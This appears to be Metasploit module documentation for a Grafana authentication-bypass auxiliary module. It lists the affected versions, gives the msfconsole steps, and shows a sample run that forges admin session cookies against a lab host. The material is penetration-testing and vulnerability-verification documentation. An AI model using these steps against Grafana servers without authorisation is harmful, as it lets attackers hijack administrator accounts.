## Vulnerable Application

The following list shows the vulnerable versions of Grafana when configured for LDAP or OAuth:

  1.  2.x 
  2.  3.x
  3.  4.x befroe 4.6.4
  4.  5.x before 5.2.3

## Verification Steps

  1. Start msfconsole
  2. Do: ``use auxiliary/admin/http/grafana_auth_bypass``
  3. Do: ``set username <username>`` or ``set cookie <cookie>`` 
  5. Do: ``set version``
  6. Do: ``set rhosts``
  7. Do: ``set rport``
  8. Do: ``run``

## Scenarios

  Example run against Grafana 3.x with username admin:

```
msf5 > use auxiliary/admin/http/grafana_auth_bypass 
msf5 auxiliary(admin/http/grafana_auth_bypass) > show options 

Module options (auxiliary/admin/http/grafana_auth_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COOKIE                      no        Decrypt captured cookie
   RHOSTS     127.0.0.1        yes       Address of target
   RPORT      3000             yes       Port of target
   SSL        false            yes       set SSL/TLS based connection
   TARGETURI  /                no        Base URL of grafana instance
   THREADS    1                yes       The number of concurrent threads
   USERNAME                    no        Valid username
   VERSION    5                yes       Grafana version: "2-4" or "5" (Accepted: 2-4, 5)

msf5 auxiliary(admin/http/grafana_auth_bypass) > set RHOSTS 192.168.202.3
RHOSTS => 192.168.202.3
msf5 auxiliary(admin/http/grafana_auth_bypass) > set USERNAME Administrator
USERNAME => Administrator
msf5 auxiliary(admin/http/grafana_auth_bypass) > run

[*] Running for 192.168.202.3...
[+] Encrypted remember cookie: 1bedc565c40b58307afa4672efd72d3c37f02684c2deb0ce0b55594cbce337fc90625356dc232e998f
[+] Set following cookies to get access to the grafana instance.
[+] grafana_user=Administrator;
[+] grafana_remember=a232b98b9365d3d8f7ce253adfb9779f1114131a68cc8cbb4a53ee6f5cb71acfbe25773e95db051021;
[+] grafana_sess=4ecdc0c13ebca229;
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
